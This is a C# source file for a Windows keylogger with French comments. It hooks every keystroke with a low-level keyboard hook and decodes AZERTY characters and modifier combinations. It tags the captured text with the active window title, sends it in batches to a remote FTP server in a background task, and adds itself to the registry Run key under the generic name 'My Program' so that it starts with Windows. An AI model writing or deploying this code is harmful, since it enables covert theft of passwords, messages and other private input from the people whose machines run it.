using System;
using System.ComponentModel;
using System.Drawing;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Threading.Tasks;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;

namespace MyKeyLogger
{
	public partial class TrackKeyboard : Form
	{
		public TrackKeyboard()
		{
			InitializeComponent();
		}
	
		private static Dictionary<int, string> LayoutAzerty = new Dictionary<int, string>
		{
			{32, " "},
			{49, "&"},
			{50, "é"},
			{51, "\""},
			{52, "'"},
			{53, "("},
			{54, "-"},
			{55, "è"},
			{56, "_"},
			{57, "ç"},
			{48, "à"},
			{219, ")"},
			{187, "="},
			{222, "²"},
			{188, ","},
			{190, ";"},
			{191, ":"},
			{223, "!"},
			{186, "$"},
			{192, "ù"},
			{220, "*"},
			{221, "^"},
			{1049, "1"},
			{1050, "2"},
			{1051, "3"},
			{1052, "4"},
			{1053, "5"},
			{1054, "6"},
			{1055, "7"},
			{1056, "8"},
			{1057, "9"},
			{1048, "0"},
			{1219, "°"},
			{1187, "+"},
			{1188, "?"},
			{1190, "."},
			{1191, "/"},
			{1223, "§"},
			{1186, "£"},
			{1192, "%"},
			{1220, "µ"},
			{1221, "¨"},
			{3050, "~"},
			{3051, "#"},
			{3052, "{"},
			{3053, "["},
			{3054, "|"},
			{3055, "`"},
			{3056, "\\"},
			{3057, "^"},
			{3048, "@"},
			{3219, "]"},
			{3187, "}"},
			{226, "<"},
			{1226, ">"},
			{3186, "¤"},
			{3069, "€"}
		};

		//
		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.ActiveWindowName() + "\\:\\";
		// Pour ignorer les appui
		private static int[] IgnoredKey = {160, 162, 163, 164, 20, 165};
		
		// 
		private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
	
        //  
        private static bool CapsLock = false;
        private static bool Caps = false;

        private static IntPtr hookID = IntPtr.Zero;
		
        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hmod, uint dwThreadId);

        //
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                
	    // https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);  

        private static LowLevelKeyboardProc proc = HookCallback;
        
        // Permet d'enregistrer un rappel à appeler, proc, qui sera appelée à chaque pression de touche.
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        // Déclenche lorsqu'un utilisateur utilise le clavier
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
        		// Retourne la valeur décimale de la touche clavier 
				int myASCIIKey = Marshal.ReadInt32(lParam);
	
				// Retourne l'état de la touche Ver.Maj
				CapsLock = Console.CapsLock;
				
				// Retourne l'état des touches de modification : Shift, Control et Alt
		        var modif = Control.ModifierKeys;
		        var myKey = Enum.GetName(typeof(Keys), myASCIIKey);
		        Caps = (modif == Keys.Shift);
		        
		        // Débogage
		        //Console.WriteLine(" wParam : " + wParam + " - myASCIIKey : " + myASCIIKey + " - myKey : " + myKey + " - CapsLock : " + CapsLock + " - modif : " + modif + " - Caps : " + Caps);

				// Si appui sur une touche clavier
		        if (wParam == (IntPtr) WM_KEYDOWN || wParam == (IntPtr) WM_SYSKEYDOWN)
			        {
				        string val = "";
				        
				        //Vérifie si un caractère alphabétique et saisie 
				        if (myASCIIKey > 64 && myASCIIKey < 91 && (modif == Keys.None || modif == Keys.Shift))
				        {
				        	// Vérifie si l'une des deux touches claviers est activée
					        if (Caps ^ CapsLock)
					        {
					        	// le caractère alphabétique (en majuscule)
						        val = myKey;
					        }
					        else
					        {
					        	// le caractère alphabétique convertie en minuscule
						        val = myKey.ToLower();
					        }
				        } else
				        {
					        //On s'interesse maintenant aux touches spéciales accessible avec des combinaisons.
					        // Pour cela, on va chercher le code de la touche dans un dictionnaire. Si on appuie en même
					        // temps sur la touche maj, on ajoute 1000 à la valeurs et si on appui sur Alt Gr. on ajoute 3000.
					        // Cela permet de les rechercher aussi dans le dictionnaire.
					        if ((Caps ^ CapsLock) && (modif == Keys.None || modif == Keys.Shift) && !IgnoredKey.Contains(myASCIIKey))
						        myASCIIKey += 1000;
					        
					        if (modif == (Keys.Control | Keys.Alt))
						        myASCIIKey += 3000;

							// Si la valeur est présente dans le dictionnaire, on ajoute la valeur au texte.
					        if (LayoutAzerty.ContainsKey(myASCIIKey) && (modif == Keys.None || modif == Keys.Shift || modif == (Keys.Control | Keys.Alt)))
					        {
						        val = LayoutAzerty[myASCIIKey];
					        }
					        // Si c'est une combaison de touche, on l'enregistre comme tel.
					        else if (myASCIIKey < 1000 && LayoutAzerty.ContainsKey(myASCIIKey))
					        {
						        val = "`" + modif + "+" + LayoutAzerty[myASCIIKey] + "`";
					        }
					        else if (!IgnoredKey.Contains(myASCIIKey))
					        {
						        // Si c'est une touche spéciale on l'enregistre aussi.
						        if (modif == Keys.None)
						        {
							        val = "`" + myKey + "`";
						        }
						        else
						        {
							        val = "`" + modif + "+" + myKey + "`";
						        }
					        }
				        }
				        // Le caractère ` est utilisé pour séparer les touches spéciales du texte et doit être échappé.
				        if (val != "" && "\\`".Contains(val))
					        val = "\\" + val;
				        data = data + val;
				        
				        // Débogage
				        //Console.WriteLine(" wParam : " + wParam + " - myASCIIKey : " + myASCIIKey + " - myKey : " + myKey + " - CapsLock : " + CapsLock + " - modif : " + modif + " - Caps : " + Caps);
				        //Console.WriteLine("valeur : " + val + " longueur de la stream : "+ data.Length);
			        }
		        if (data.Length > 256)
				{

			        data = data + "\n";
			        string tempData = data;
			        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.ActiveWindowName() + "\\:\\";
			        
			        // Déclenche une nouvelle tache en parallèle (appel à la méthode ServerFTP.ConnectionServer) 
			        // Cela permet d'éviter des problèmes si le transfert prend trop de temps.
			        Task.Factory.StartNew(() => ServerFTP.ConnectionServer(tempData));
		        }
		        
		        return CallNextHookEx(hookID, nCode, wParam, lParam);
        }
        
        // Exécute l'application automatiquement au démarrage de Windows 10
        private static void AddApplicationToStartup()
        {
	        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
	        {
		        key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
	        }
        }
        
        public static void Start()
        {        	
	        // Exécute l'application automatiquement au démarrage de Windows 10
            AddApplicationToStartup();
        	
            // Désactive la touche Ver.Maj du clavier
            //OperationKey.TurnOFFCapsLockKey();
            
            // Defnit une fonction de rappel qui sera appelée à chaque pression de touche.
            hookID = SetHook(proc);
            
            // Permet au formulaire de recevoir des messages Windows (des pressions sur des touches claviers) 
            Application.Run();
            
        }
	}
	
}